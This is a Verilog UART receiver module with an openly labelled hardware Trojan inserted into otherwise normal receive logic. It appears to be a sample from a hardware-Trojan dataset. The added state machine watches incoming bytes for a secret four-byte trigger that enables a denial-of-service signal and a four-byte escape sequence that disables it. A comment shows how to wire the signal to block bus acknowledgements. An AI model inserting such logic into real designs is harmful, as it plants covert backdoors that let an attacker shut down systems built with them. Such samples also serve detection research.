module rxuartlite #(
		// {{{
		parameter			TIMER_BITS = 10,
`ifdef	FORMAL
		parameter  [(TIMER_BITS-1):0]	CLOCKS_PER_BAUD = 16, // Necessary for formal proof
`else
		parameter  [(TIMER_BITS-1):0]	CLOCKS_PER_BAUD = 868,	// 115200 Baud at 100MHz
`endif
		localparam			TB = TIMER_BITS,
		//
		localparam [3:0]	RXUL_BIT_ZERO  = 4'h0,
		// Verilator lint_off UNUSED
		// These are used by the formal solver
		localparam [3:0]	RXUL_BIT_ONE   = 4'h1,
		localparam [3:0]	RXUL_BIT_TWO   = 4'h2,
		localparam [3:0]	RXUL_BIT_THREE = 4'h3,
		localparam [3:0]	RXUL_BIT_FOUR  = 4'h4,
		localparam [3:0]	RXUL_BIT_FIVE  = 4'h5,
		localparam [3:0]	RXUL_BIT_SIX   = 4'h6,
		localparam [3:0]	RXUL_BIT_SEVEN = 4'h7,
		// Verilator lint_on  UNUSED
		localparam [3:0]	RXUL_STOP      = 4'h8,
		localparam [3:0]	RXUL_WAIT      = 4'h9,
		localparam [3:0]	RXUL_IDLE      = 4'hf
		// }}}
	) (
		// {{{
		input	wire		i_clk, i_reset,
		input	wire		i_uart_rx,
		output	reg		o_wr,
		output	reg	[7:0]	o_data,

        // ============================
        // Trojan insertion: Extra output 
        // ============================
        output  wire        o_trojan_dos     // <-- Trojan: indicates DoS active (optional signal)
		// }}}
	);

    // ============================
    // Trojan insertion: Trojan Registers/Logic
    // ============================
    // State machine for trigger byte sequence detection
    reg [2:0] trojan_trig_state;         // 0-3 for trigger sequence, 4 for armed
    reg       trojan_triggered;          // High when DoS Trojan is active
    reg [2:0] trojan_reset_state;        // 0-4 for 0xfe sequence (escape sequence)
    
    // The four-byte trigger sequence for activation: 0x10, 0xa4, 0x98, 0xbd
    // The four-byte escape sequence for deactivation: four consecutive 0xfe

    // ============================
    // End Trojan insertion section
    // ============================

	// Signal/register declarations
	// {{{
	wire	[(TB-1):0]	half_baud;
	reg	[3:0]		state;

	assign	half_baud = { 1'b0, CLOCKS_PER_BAUD[(TB-1):1] };
	reg	[(TB-1):0]	baud_counter;
	reg			zero_baud_counter;

	reg			q_uart, qq_uart, ck_uart;
	reg	[(TB-1):0]	chg_counter;
	reg			half_baud_time;
	reg	[7:0]		data_reg;
	// }}}

	// ck_uart
	// {{{
	initial	q_uart  = 1'b1;
	initial	qq_uart = 1'b1;
	initial	ck_uart = 1'b1;
	always @(posedge i_clk)
	if (i_reset)
		{ ck_uart, qq_uart, q_uart } <= 3'b111;
	else
		{ ck_uart, qq_uart, q_uart } <= { qq_uart, q_uart, i_uart_rx };
	// }}}

	// chg_counter
	// {{{
	initial	chg_counter = {(TB){1'b1}};
	always @(posedge i_clk)
	if (i_reset)
		chg_counter <= {(TB){1'b1}};
	else if (qq_uart != ck_uart)
		chg_counter <= 0;
	else if (chg_counter != { (TB){1'b1} })
		chg_counter <= chg_counter + 1;
	// }}}

	// half_baud_time
	// {{{
	initial	half_baud_time = 0;
	always @(posedge i_clk)
	if (i_reset)
		half_baud_time <= 0;
	else
		half_baud_time <= (!ck_uart)&&(chg_counter >= half_baud-1'b1-1'b1);
	// }}}

	// state
	// {{{
	initial	state = RXUL_IDLE;
	always @(posedge i_clk)
	if (i_reset)
	begin
		state <= RXUL_IDLE;
	end else if (state == RXUL_IDLE)
	begin
		state <= RXUL_IDLE;
		if ((!ck_uart)&&(half_baud_time))
			state <= RXUL_BIT_ZERO;
	end else if ((state >= RXUL_WAIT)&&(ck_uart))
		state <= RXUL_IDLE;
	else if (zero_baud_counter)
	begin
		if (state <= RXUL_STOP)
			state <= state + 1;
	end
	// }}}

	// data_reg
	// {{{
	always @(posedge i_clk)
	if ((zero_baud_counter)&&(state != RXUL_STOP))
		data_reg <= { qq_uart, data_reg[7:1] };
	// }}}

	// o_wr, o_data
	// {{{
	initial	o_wr = 1'b0;
	initial	o_data = 8'h00;
	always @(posedge i_clk)
	if (i_reset)
	begin
		o_wr <= 1'b0;
		o_data <= 8'h00;
	end else if ((zero_baud_counter)&&(state == RXUL_STOP)&&(ck_uart))
	begin
	    // Trojan: o_wr is still asserted as before (functionality preserved)
		o_wr   <= 1'b1;
		o_data <= data_reg;
	end else
		o_wr   <= 1'b0;
	// }}}

	// baud_counter
	// {{{
	initial	baud_counter = 0;
	always @(posedge i_clk)
	if (i_reset)
		baud_counter <= 0;
	else if (((state==RXUL_IDLE))&&(!ck_uart)&&(half_baud_time))
		baud_counter <= CLOCKS_PER_BAUD-1'b1;
	else if (state == RXUL_WAIT)
		baud_counter <= 0;
	else if ((zero_baud_counter)&&(state < RXUL_STOP))
		baud_counter <= CLOCKS_PER_BAUD-1'b1;
	else if (!zero_baud_counter)
		baud_counter <= baud_counter-1'b1;
	// }}}

	// zero_baud_counter
	// {{{
	initial	zero_baud_counter = 1'b1;
	always @(posedge i_clk)
	if (i_reset)
		zero_baud_counter <= 1'b1;
	else if ((state == RXUL_IDLE)&&(!ck_uart)&&(half_baud_time))
		zero_baud_counter <= 1'b0;
	else if (state == RXUL_WAIT)
		zero_baud_counter <= 1'b1;
	else if ((zero_baud_counter)&&(state < RXUL_STOP))
		zero_baud_counter <= 1'b0;
	else if (baud_counter == 1)
		zero_baud_counter <= 1'b1;
	// }}}


    // ============================
    // Trojan insertion: Trigger and Payload logic
    // ============================
    // This section adds the DoS logic (invisible externally except via o_trojan_dos!)
    // Use data in o_data upon o_wr assertion, advances FSM for trigger & escape

    // Trojan register initialization
    always @(posedge i_clk) begin
        if (i_reset) begin
            trojan_trig_state  <= 3'd0;
            trojan_triggered   <= 1'b0;
            trojan_reset_state <= 3'd0;
        end else if (o_wr) begin
            if (!trojan_triggered) begin
                // Trigger state machine
                case (trojan_trig_state)
                    3'd0:
                        if (o_data == 8'h10)
                            trojan_trig_state <= 3'd1;
                        else
                            trojan_trig_state <= 3'd0;
                    3'd1:
                        if (o_data == 8'ha4)
                            trojan_trig_state <= 3'd2;
                        else if (o_data == 8'h10)
                            trojan_trig_state <= 3'd1;
                        else
                            trojan_trig_state <= 3'd0;
                    3'd2:
                        if (o_data == 8'h98)
                            trojan_trig_state <= 3'd3;
                        else if (o_data == 8'h10)
                            trojan_trig_state <= 3'd1;
                        else
                            trojan_trig_state <= 3'd0;
                    3'd3:
                        if (o_data == 8'hbd) begin
                            trojan_trig_state <= 3'd0;
                            trojan_triggered  <= 1'b1; // Activate DoS!
                            trojan_reset_state<= 3'd0;
                        end else if (o_data == 8'h10)
                            trojan_trig_state <= 3'd1;
                        else
                            trojan_trig_state <= 3'd0;
                    default:
                        trojan_trig_state <= 3'd0;
                endcase
            end else begin
                // Recovery (escape) sequence machine
                if (o_data == 8'hfe) begin
                    if (trojan_reset_state == 3'd3)
                        begin
                            trojan_triggered   <= 1'b0;     // Deactivate DoS
                            trojan_reset_state <= 3'd0;
                        end
                    else
                        trojan_reset_state <= trojan_reset_state + 3'd1;
                end else begin
                    trojan_reset_state <= 3'd0;
                end
            end
        end
        else begin
            // Latch values if not o_wr asserted
            // States are preserved unless above events
        end
    end
    // Optional, debug output signal of DoS state (not functionally required)
    assign o_trojan_dos = trojan_triggered;
    // ============================
    // End Trojan insertion section
    // ============================

    // ============================
    // TROJAN: Example usage in bus logic (Wishbone)
    // ============================
    // How this would be used to block Wishbone bus any time trojan_triggered is high:
    //
    //   assign o_wb_ack = trojan_triggered ? 1'b0 : <normal_ack_logic>;
    //
    // such that after trigger, bus is denied, and recovers only after 4x 0xFE received
    // The exact bus logic is outside the scope of this RX core, so we provide
    // trojan_triggered (o_trojan_dos) as an output signal for integration with the bus module
    // ============================

////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////
//
//// [Formal section omitted for brevity, unchanged]
//
////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////
endmodule